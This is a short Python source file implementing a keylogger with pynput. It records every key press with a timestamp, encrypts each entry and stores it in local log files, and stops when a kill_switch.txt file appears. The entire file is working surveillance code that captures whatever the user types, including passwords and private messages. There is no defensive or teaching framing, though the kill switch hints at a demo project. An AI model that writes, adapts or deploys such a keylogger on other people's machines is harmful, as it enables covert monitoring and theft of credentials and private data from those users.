from pynput import keyboard
from datetime import datetime
from encryptor import encrypt_data
import os

LOG_DIR = "logs/encrypted_logs"
os.makedirs(LOG_DIR, exist_ok=True)

def write_encrypted_log(key_str):
    now = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    encrypted = encrypt_data(f"{now} - {key_str}")
    filename = f"{LOG_DIR}/{now}.log"
    with open(filename, 'wb') as f:
        f.write(encrypted)

def on_press(key):
    try:
        if os.path.exists("kill_switch.txt"):
            print("Kill switch activated. Exiting...")
            return False  # Stop keylogger

        key_str = key.char if hasattr(key, 'char') else str(key)
        write_encrypted_log(key_str)
    except Exception as e:
        print(f"Error: {e}")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
